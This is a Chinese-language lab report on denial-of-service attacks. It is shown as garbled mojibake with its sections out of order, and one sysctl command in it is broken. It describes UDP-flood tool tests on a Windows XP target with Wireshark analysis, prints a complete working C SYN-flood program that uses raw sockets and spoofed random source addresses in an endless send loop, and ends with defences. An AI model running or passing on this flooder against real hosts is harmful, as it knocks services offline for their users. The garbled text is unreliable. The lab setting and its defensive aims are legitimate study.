è¿™ç§æ”»å‡»ä¸»è¦æ˜¯ä½¿ç”¨åƒµå°¸ç½‘ç»œè¿›è¡Œå›ºå®šæºåœ°å€çš„æ”»å‡» 0x03 å®éªŒç¯å¢ƒ éƒ¨ç½²äºåŒä¸€å±€åŸŸç½‘ä¸‹ æ”»å‡»æœº ç½‘ç»œå®‰å…¨å®éªŒ Windows xp IP:192.168.195.131 MAC :00-0C-29-06-65-C9 é¶æœº æ±‡ç¼– Windows xp IP:192.168.195.135 MAC : 00-0c-29-19-ba-6e ç¨‹åºè¿è¡Œæœºå™¨ Ubuntu 16 ç½‘å…³ IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 å·¥å…·ï¼š udp-Flood é˜¿æ‹‰ä¸ visual studio code wireshark 0x04 å·¥å…·åˆ†æ udp_Flood é¦–å…ˆçœ‹ä¸€ä¸‹é¶æœºIP:192.168.195.135å¼€æ”¾çš„ç«¯å£\nå‘ç°TCPä¸­21ã€22ã€80ç«¯å£å‡å¼€å¯ï¼ŒUDPå¼€å¯445,500ç«¯å£ é¦–å…ˆåœ¨æ”»å‡»æœºæ‰“å¼€udp_floodå·¥å…·ï¼Œå¯¹80ç«¯å£è¿›è¡Œæ”»å‡»ã€‚\næ¯ç§’å‘11ä¸ªåŒ… ç„¶ååœ¨é¶æœºä¸­æ‰“å¼€Wiresharkè¿›è¡ŒæŠ“åŒ…\nå®¹æ˜“å‘ç°ï¼Œæ”»å‡»æœºå‘é¶æœºæ¯å‘ä¸€ä¸ªUDPåŒ…ï¼Œé¶æœºå°±ä¼šå›åº”ä¸€ä¸ªICMPåŒ…\nä¸éš¾å‘ç°ï¼ŒudpåŒ…çš„æ•°æ®æµéƒ½æ²¡æœ‰é—®é¢˜ï¼Œæ‰€æœ‰udpåŒ…çš„å¤§å°ç›¸åŒï¼Œåè®®ç›¸åŒï¼ŒçŸ­æ—¶é—´å‘é€å¤§é‡çš„åŒ…\nä½†æ˜¯æœåŠ¡å™¨å›æ˜¾ICMPæ˜¾ç¤ºPort Unreachable\nè¿™æ˜¯å› ä¸ºæœåŠ¡å™¨å“åº”å‘é€åˆ°å…¶ä¸­ä¸€ä¸ªç«¯å£çš„UDPæ•°æ®åŒ…æ‰€é‡‡å–çš„æ­¥éª¤ã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå½“æœåŠ¡å™¨åœ¨ç‰¹å®šç«¯å£æ¥æ”¶åˆ°UDPæ•°æ®åŒ…æ—¶ï¼Œä¼šç»è¿‡ä¸¤ä¸ªæ­¥éª¤ï¼š\næœåŠ¡å™¨é¦–å…ˆæ£€æŸ¥æ˜¯å¦æ­£åœ¨è¿è¡Œæ­£åœ¨ä¾¦å¬æŒ‡å®šç«¯å£çš„è¯·æ±‚çš„ç¨‹åºã€‚ å¦‚æœæ²¡æœ‰ç¨‹åºåœ¨è¯¥ç«¯å£æ¥æ”¶æ•°æ®åŒ…ï¼Œåˆ™æœåŠ¡å™¨ä½¿ç”¨ICMPï¼ˆpingï¼‰æ•°æ®åŒ…è¿›è¡Œå“åº”ï¼Œä»¥é€šçŸ¥å‘é€æ–¹ç›®çš„åœ°ä¸å¯è¾¾ã€‚ 80ç«¯å£å¹¶æ²¡æœ‰UDPè¿›è¡Œç›‘å¬ï¼Œå› æ­¤æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªICMPåŒ…ï¼Œå‘Šè¯‰å‘é€æ–¹ä¸å¯åˆ°è¾¾ã€‚\nè¿™é‡Œåˆ©ç”¨UDPå¼€å§‹ç›‘å¬çš„445ç«¯å£è¿›è¡Œå®éªŒ\nudpå‘é€çš„åŒ…åŒæ ·æ²¡æœ‰é—®é¢˜ï¼Œå¤§å°ç›¸åŒï¼Œå‡ä¸º83ã€‚ è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹udp_floodæ”»å‡»ä¹‹å‰çš„æ—¶é—´\nç„¶åæ‰“å¼€udp_floodï¼Œæ”»å‡»80ç«¯å£ å¯ä»¥çœ‹åˆ°é˜¿æ‹‰ä¸udp_floodæ”»å‡»ä¹‹åï¼Œè®¿é—®ç™¾åº¦ä¼šä¸¢åŒ…ï¼Œç„¶åå¹³å‡æ—¶é—´ä¹Ÿå¢åŠ äº† å› æ­¤ï¼Œudp_floodä¸€å®šç¨‹åº¦ä¸Šä¼šé˜»ç¢æœåŠ¡å™¨çš„è®¿é—®é€Ÿåº¦ã€‚ å› æ­¤ï¼Œåœ¨udp_floodæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯å‘é€å¤§é‡ä¼ªé€ æºIPåœ°å€çš„å°udpåŒ…ã€‚ç”±äºUDPåè®®æ˜¯æ— è¿æ¥æ€§çš„ï¼Œæ‰€ä»¥åªè¦å¼€äº†ä¸€ä¸ªUDPçš„ç«¯å£æä¾›ç›¸å…³æœåŠ¡çš„è¯ï¼Œé‚£ä¹ˆå°±å¯é’ˆå¯¹ç›¸å…³çš„æœåŠ¡è¿›è¡Œæ”»å‡»ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ¶ˆè€—çš„æ˜¯æ”»å‡»è€…ä¸é¶æœºæ–¹ä¸¤æ–¹èµ„æºçš„æ¯”æ‹¼ã€‚\né˜¿æ‹‰ä¸ é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹é¶æœºå¼€æ”¾çš„ç«¯å£ åœ¨æ”»å‡»æœºä¸­æ‰“å¼€é˜¿æ‹‰ä¸udpæ´ªæ°´æ”»å‡»å™¨ é¦–å…ˆå·¥å…·é¶æœºçš„80ç«¯å£ ä¾¿äºæµ‹è¯•ï¼Œè¿™é‡Œè¿›è¡Œä¸€èˆ¬udpæ”»å‡» åœ¨é¶æœºä¸­è·Ÿæ®Wiresharkè¿›è¡ŒæŠ“åŒ… åˆ†æä¸€ä¸‹udpæ•°æ®åŒ… å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°udpæ•°æ®åŒ…çš„æºIPã€MACå’Œç›®çš„IPã€MACéƒ½æ˜¯æ­£ç¡®çš„ï¼Œå”¯ä¸€å¼‚å¸¸çš„æ˜¯udpä¼ é€çš„æ•°æ®åŒ…Dataçš„æ•°æ®è¿‡é•¿ï¼Œä¸º3000byte, åŒæ—¶udpå› ä¸ºè¶…è¿‡1500ä¼šåˆ†ç‰‡ä¼ è¾“ï¼Œå¤§å¤§æé«˜äº†æ”»å‡»çš„æ•ˆç‡ã€‚ å°†ç«¯å£æ”¹ä¸º445 åˆ†æä¸€ä¸‹udpçš„ç»“æ„ å‘ç°ä¹Ÿå®Œå…¨ç¬¦åˆé¢„æœŸï¼Œå’Œudp_floodç›¸æ¯”ï¼Œåªæ˜¯åŒ…çš„å¤§å°å˜å¤§äº†ï¼ŒDDOSçš„å¨åŠ›ä¹Ÿæ›´å¼ºå¤§äº†ã€‚ è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹å·¥å…·å‰ ping www.baidu.comçš„æ—¶å»¶ æ”»å‡»é¶æœºçš„80ç«¯å£ å¾ˆæ˜æ˜¾çœ‹åˆ°æ”»å‡»åçš„udpæ”»å‡»ä½¿å¾—æœåŠ¡å™¨çš„æœ€é«˜æ—¶å»¶å¢åŠ ã€‚ å› æ­¤ï¼Œudp_floodä¸€å®šç¨‹åº¦ä¸Šä¼šé˜»ç¢æœåŠ¡å™¨çš„è®¿é—®é€Ÿåº¦ã€‚ ç”±æ­¤å¯ä»¥çŸ¥é“ï¼Œudp_floodå·¥å…·å’Œé˜¿æ‹‰ä¸çš„åŸç†ç›¸åŒï¼Œéƒ½æ˜¯åˆ©ç”¨UDPæ´ªæ°´æ”»å‡»ï¼Œå¤§æ‰¹é‡çš„æ¶ˆè€—èµ„æºæ¥è¿›è¡ŒDDOSæ”»å‡»ã€‚ æ”»å‡»æ•ˆæœçš„è¯ï¼Œå¦‚æœå¸¦å®½ã€æµé‡è¶³å¤Ÿå¤§çš„è¯ï¼ŒæœåŠ¡å™¨çš„ä¼šä¸æ–­çš„æ¥å—åŒ…ã€ç„¶åç˜«ç—ªã€æ— æ³•æ­£å¸¸ä¸Šç½‘ã€‚ 0x05 SYN-Flood ç¼–ç¨‹å®ç° è¿™é‡Œç”¨å¥—æ¥å­—socketçš„æ–¹æ³•æ¥å®ç°syn-floodæ”»å‡»\nåªéœ€è¦æ„é€ å¥½ä¸€ä¸ªTCPåŒ…ï¼ŒæŒ‡å®šå¥½åŒ…ä¸­IP.flags=0x02(ä¸ºSYNåŒ…)ã€‚\næˆ‘ä»¬è¿™é‡Œåœ¨ubuntu 16 çš„ç¯å¢ƒä¸­ç¼–è¯‘æˆ‘ä»¬å†™å¥½çš„ç¨‹åº\né¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹é¶æœº(IP : 192.168.195.135)çš„å¼€æ”¾ç«¯å£\nå‘ç°å¼€å¯äº†21ã€22ã€80ç«¯å£ åœ¨ç¨‹åºä¸­ï¼Œå¯¹192.168.195.135çš„80ç«¯å£è¿›è¡Œæ”»å‡»\nå› ä¸ºç¨‹åºæ˜¯æ— é™å¾ªç¯å‘é€ï¼Œéœ€è¦æ‰‹åŠ¨ç»ˆæ­¢ ä¸æ­¤åŒæ—¶ï¼Œåˆ©ç”¨Wiresharkåœ¨é¶æœºè¿›è¡ŒæŠ“åŒ…\nå¯ä»¥çœ‹åˆ°ç¨‹åºéšæœºäº§ç”Ÿå¤§é‡çš„è™šå‡åœ°å€å’Œè™šå‡çš„ç«¯å£å¯¹é¶æœºçš„80ç«¯å£è¿›è¡Œè®¿é—®ï¼Œå› ä¸ºåœ°å€å’Œç«¯å£éƒ½ä¸ºè™šå‡çš„ï¼Œæ‰€ä»¥å¤§é‡çš„tcpè¿æ¥é¶æœºæ— æ³•å¯¹å…¶ackå›å¤ã€‚ äº§ç”Ÿå¤§é‡çš„synåŠè¿æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨è½½è·è¿‡å¤§ï¼Œä»è€Œå´©æºƒã€‚\næŸ¥çœ‹æ­¤æ—¶çš„synçŠ¶æ€ã€‚ å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°ï¼Œç¨‹åºäº§ç”Ÿäº†å¤§é‡çš„synåŠè¿æ¥ï¼Œæ¥è‡ªä¸åŒçš„è™šå‡ipåœ°å€å’Œç«¯å£ æŸ¥çœ‹æ”»å‡»å‰ ping www.baidu.com çš„æ•ˆæœ\næ”»å‡»å…¶21ç«¯å£ å‘ç°ping www.baidu.com å·²ç»ä¸èƒ½Pingé€š åŒæ—¶å¾ˆæ˜æ˜¾çš„æ„Ÿå—åˆ°Windows xpå› ä¸ºå—åˆ°SYNæ”»å‡»ï¼Œå› æ­¤è¿è¡Œä¸æµç•…ï¼Œå¡é¡¿ç›¸å½“ä¸¥é‡ã€‚\nå®é™…ä¸Šï¼ŒSYN-floodæ”»å‡»å°±æ˜¯ æ„é€ å¤§é‡çš„SYNåŒ…ã€é‡Œé¢å¡«å……è™šå‡çš„IPã€MACåœ°å€ï¼Œæ¥é€ æˆæœåŠ¡å™¨äº§ç”Ÿå¤§é‡çš„åŠè¿æ¥ï¼Œä»è€Œé€ æˆæœåŠ¡å™¨è¿è¡Œç˜«ç—ªã€‚\nå®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip æŠ¥å¤´ struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; // tcp æŠ¥å¤´ struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; //TCPçš„ä¼ªæŠ¥å¤´ï¼Œåœ¨è®¡ç®—TCPçš„æ ¡éªŒå’Œæ—¶éœ€è¦åŒ…å« struct pseudohdr { unsigned int saddr; //æºç›®çš„IP unsigned int daddr; // ç›®çš„IP char zeros; // 8ä½ä¿ç•™å­—ç¬¦ ä¸€èˆ¬ç½®0 char protocol;// åè®® unsigned short length; // é•¿åº¦ }; // è¿™ä¸ªæ˜¯è®¡ç®—æ ¡éªŒå’Œçš„å‡½æ•° unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // é€šè¿‡ä¼ å…¥çš„æº IP åœ°å€å’Œç›®æ ‡ IP åœ°å€åˆå§‹åŒ– IP å¤´éƒ¨ç»“æ„ã€‚ void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // æºIPåœ°å€ ip-\u0026gt;dstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } // åˆå§‹åŒ– tcp åŒ… void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u0026gt;dport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 ä»£è¡¨ æ˜¯syn åŒ…ï¼Œtcpä¸‰æ¬¡è¿æ¥è¯·æ±‚çš„å¼€å§‹ tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // åˆå§‹åŒ– tcp ä¼ªæŠ¥å¤´ void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // é€šè¿‡ ç›®æ ‡IPåœ°å€ å’Œ ç›®æ ‡ç«¯å£ ç”Ÿæˆä¸€ä¸ª SYNåŒ…ï¼Œä¿å­˜åˆ°å‚æ•° packet ä¸­ï¼Œå¹¶ä¸”è¿”å›åŒ…çš„å¤§å°ã€‚ int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // åˆ›é€ åŸå§‹å¥—æ¥å­— int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* åœ¨è°ƒç”¨ socket() å‡½æ•°åˆ›å»ºå¥—æ¥å­—æ—¶ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ä¸º SOCK_RAWï¼Œè¡¨ç¤ºåˆ›å»ºçš„å¥—æ¥å­—ä¸ºåŸå§‹å¥—æ¥å­—ã€‚ç„¶åè°ƒç”¨ setsockopt() å‡½\tæ•°è®¾ç½® IP å¤´éƒ¨ç”±æˆ‘ä»¬è‡ªå·±æ„å»º */ return fd; } // ä¼ å…¥åŸå§‹å¥—æ¥å­—ã€ç›®æ ‡IPåœ°å€å’Œç›®æ ‡ç«¯å£ï¼Œç„¶åé€šè¿‡è°ƒç”¨ sendto() å‡½æ•°å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ª SYNåŒ… int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%då·²æ”»å‡»!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // ä¸»å‡½æ•° int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] ç›®çš„åœ°å€ // argc[2] ç›®çš„ç«¯å£ addr = inet_addr(argv[1]); port = atoi(argv[2]); // åˆ¤æ–­ç«¯å£æ˜¯å¦ å­˜åœ¨ if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // å¼€å¯socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for æ— é™å¾ªç¯ï¼Œå‘é€synåŒ… for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } 0x06 å®éªŒç»“è®º udp_floodæ”»å‡»å°±æ˜¯æ„é€ å¤§é‡çš„udpåŒ…(å¯ä»¥æºå¸¦å°‘é‡æ•°æ®ï¼Œä¹Ÿå¯ä»¥æºå¸¦å¤§é‡æ•°æ®ï¼Œæºå¸¦æ•°æ®é‡è¶Šå¤§å¯¹æœåŠ¡å™¨çš„è½½è·æ‰¿å—å°±è¶Šä¸¥é‡)ï¼Œå ç”¨æœåŠ¡å™¨å¤§é‡çš„å¤„ç†å†…å­˜ï¼Œä»è€Œå¼•èµ·æœåŠ¡å™¨å´©æºƒã€‚\nSYN-Floodä¸‰ç§æ”»å‡»æ–¹å¼\nDirect Attack æ”»å‡»æ–¹ä½¿ç”¨å›ºå®šçš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•å¯¹æ”»å‡»æ–¹çš„æ¶ˆè€—æœ€å°ã€‚ Spoofing(æ¬ºéª—) Attack æ”»å‡»æ–¹ä½¿ç”¨å˜åŒ–çš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•éœ€è¦æ”»å‡»æ–¹ä¸åœåœ°ä¿®æ”¹æºåœ°å€ï¼Œå®é™…ä¸Šæ¶ˆè€—ä¹Ÿä¸å¤§ã€‚ Distributed Direct Attack è¿™ç§æ”»å‡»ä¸»è¦æ˜¯ä½¿ç”¨åƒµå°¸ç½‘ç»œè¿›è¡Œå›ºå®šæºåœ°å€çš„æ”»å‡» é˜²å¾¡æ‰‹æ®µ\nUdp_Flood\nå¤§å¤šæ•°æ“ä½œç³»ç»Ÿéƒ¨åˆ†é™åˆ¶äº†ICMPæŠ¥æ–‡çš„å“åº”é€Ÿç‡ï¼Œä»¥ä¸­æ–­éœ€è¦ICMPå“åº”çš„DDoSæ”»å‡»ã€‚è¿™ç§ç¼“è§£çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯åœ¨æ”»å‡»è¿‡ç¨‹ä¸­ï¼Œåˆæ³•çš„æ•°æ®åŒ…ä¹Ÿå¯èƒ½è¢«è¿‡æ»¤ã€‚å¦‚æœUDP Floodçš„å®¹é‡è¶³å¤Ÿé«˜ä»¥ä½¿ç›®æ ‡æœåŠ¡å™¨çš„é˜²ç«å¢™çš„çŠ¶æ€è¡¨é¥±å’Œï¼Œåˆ™åœ¨æœåŠ¡å™¨çº§åˆ«å‘ç”Ÿçš„ä»»ä½•ç¼“è§£éƒ½å°†ä¸è¶³ä»¥åº”å¯¹ç›®æ ‡è®¾å¤‡ä¸Šæ¸¸çš„ç“¶é¢ˆã€‚ åˆ¤æ–­åŒ…å¤§å°ï¼Œå¦‚æœæ˜¯å¤§åŒ…æ”»å‡»åˆ™ä½¿ç”¨é˜²æ­¢UDPç¢ç‰‡æ–¹æ³•ï¼šæ ¹æ®æ”»å‡»åŒ…å¤§å°è®¾å®šåŒ…ç¢ç‰‡é‡ç»„å¤§å°ï¼Œé€šå¸¸ä¸å°äº1500ã€‚åœ¨æç«¯æƒ…å†µä¸‹ï¼Œå¯ä»¥è€ƒè™‘ä¸¢å¼ƒæ‰€æœ‰UDPç¢ç‰‡ã€‚ SYN-Flood\nç¼©çŸ­è¶…æ—¶ï¼ˆSYN Timeoutï¼‰æ—¶é—´\nç”±äºSYN Floodæ”»å‡»çš„æ•ˆæœå–å†³äºæœåŠ¡å™¨ä¸Šä¿æŒçš„SYNåŠè¿æ¥æ•°ï¼Œè¿™ä¸ªå€¼=SYNæ”»å‡»çš„é¢‘åº¦ x SYN Timeoutï¼Œæ‰€ä»¥é€šè¿‡ç¼©çŸ­ä»æ¥æ”¶åˆ°SYNæŠ¥æ–‡åˆ°ç¡®å®šè¿™ä¸ªæŠ¥æ–‡æ— æ•ˆå¹¶ä¸¢å¼ƒæ”¹è¿æ¥çš„æ—¶é—´ï¼Œä¾‹å¦‚è®¾ç½®ä¸º20ç§’ä»¥ä¸‹ï¼Œå¯ä»¥æˆå€çš„é™ä½æœåŠ¡å™¨çš„è´Ÿè·ã€‚ä½†è¿‡ä½çš„SYN Timeoutè®¾ç½®å¯èƒ½ä¼šå½±å“å®¢æˆ·çš„æ­£å¸¸è®¿é—®ã€‚\næ³¨æ„ï¼šç¼©çŸ­SYN Timeoutæ—¶é—´ä»…åœ¨å¯¹æ–¹æ”»å‡»é¢‘åº¦ä¸é«˜çš„æƒ…å†µä¸‹ç”Ÿæ•ˆ\nå¢åŠ æœ€å¤§åŠè¿æ¥æ•°\nMore Actionsåœ¨Linuxä¸­æ‰§è¡Œå‘½ä»¤â€sysctl -agrep net.ipv4.tcp_max_syn_backlogâ€å¯ä»¥æŸ¥çœ‹æœ€å¤§åŠè¿æ¥æ•°ï¼Œä¸€èˆ¬æ¥è¯´å¤§å°ä¸º128ï¼Œè¿™ä¸ªé»˜è®¤å€¼å¯¹äºWebæœåŠ¡å™¨æ¥è¯´æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œä¸€æ¬¡ç®€å•çš„SYNæ”»å‡»å°±è¶³ä»¥å°†å…¶å®Œå…¨å ç”¨ã€‚ å› æ­¤ï¼Œé˜²å¾¡DOSæ”»å‡»æœ€ç®€å•çš„åŠæ³•å°±æ˜¯å¢å¤§è¿™ä¸ªé»˜è®¤å€¼ï¼Œåœ¨Linuxä¸­æ‰§è¡Œå‘½ä»¤â€sysctl -w et.ipv4.tcp_max_syn_backlog=3000â€ï¼Œè¿™æ ·å°±å¯ä»¥å°†é˜Ÿåˆ—SYNæœ€å¤§åŠè¿æ¥æ•°å®¹é‡å€¼æ”¹ä¸º3000äº† è¿‡æ»¤ç½‘å…³é˜²æŠ¤\nä¸€ç§æ–¹å¼æ˜¯é˜²æ­¢å¢™ç¡®è®¤è¿æ¥çš„æœ‰æ•ˆæ€§åï¼Œé˜²ç«å¢™æ‰ä¼šå‘å†…éƒ¨æœåŠ¡å™¨å‘èµ·SYNè¯·æ±‚ã€‚é˜²ç«å¢™ä»£æœåŠ¡å™¨å‘å‡ºçš„SYN ACKåŒ…ä½¿ç”¨çš„åºåˆ—å·ä¸ºc, è€ŒçœŸæ­£çš„æœåŠ¡å™¨å›åº”çš„åºåˆ—å·ä¸ºcâ€™, è¿™æ ·ï¼Œåœ¨æ¯ä¸ªæ•°æ®æŠ¥æ–‡ç»è¿‡é˜²ç«å¢™çš„æ—¶å€™è¿›è¡Œåºåˆ—å·çš„ä¿®æ”¹ã€‚\nå¦ä¸€ç§æ–¹å¼æ˜¯é˜²ç«å¢™ç¡®å®šäº†è¿æ¥çš„å®‰å…¨åï¼Œä¼šå‘å‡ºä¸€ä¸ªsafe resetå‘½ä»¤ï¼Œclientä¼šè¿›è¡Œé‡æ–°è¿æ¥ï¼Œè¿™æ—¶å‡ºç°çš„synæŠ¥æ–‡ä¼šç›´æ¥æ”¾è¡Œã€‚è¿™æ ·ä¸éœ€è¦ä¿®æ”¹åºåˆ—å·äº†ã€‚ä½†æ˜¯ï¼Œclientéœ€è¦å‘èµ·ä¸¤æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼Œå› æ­¤å»ºç«‹è¿æ¥çš„æ—¶é—´å°†ä¼šå»¶é•¿ã€‚\nSYN cookiesæŠ€æœ¯\nç»™æ¯ä¸€ä¸ªè¯·æ±‚è¿æ¥çš„IPåœ°å€åˆ†é…ä¸€ä¸ªCookieï¼Œå¦‚æœçŸ­æ—¶é—´å†…è¿ç»­å—åˆ°æŸä¸ªIPçš„é‡å¤SYNæŠ¥æ–‡ï¼Œå°±è®¤å®šæ˜¯å—åˆ°äº†æ”»å‡»ï¼Œå¹¶è®°å½•åœ°å€ä¿¡æ¯ï¼Œä»¥åä»è¿™ä¸ªIPåœ°å€æ¥çš„åŒ…ä¼šè¢«ä¸€æ¦‚ä¸¢å¼ƒã€‚è¿™æ ·åšçš„ç»“æœä¹Ÿå¯èƒ½ä¼šå½±å“åˆ°æ­£å¸¸ç”¨æˆ·çš„è®¿é—®ã€‚ æ‹’ç»æœåŠ¡æ”»å‡» 0x01 å®éªŒç›®çš„ ä½¿ç”¨udp floodã€é˜¿æ‹‰ä¸ç­‰å·¥å…·ï¼Œåˆ†ç»„å±•å¼€æ”»å‡»å¹¶åˆ©ç”¨wiresharkåˆ†æã€‚ ç¼–ç¨‹å®ç°SYN Floodæ”»å‡»ã€‚ 0x02 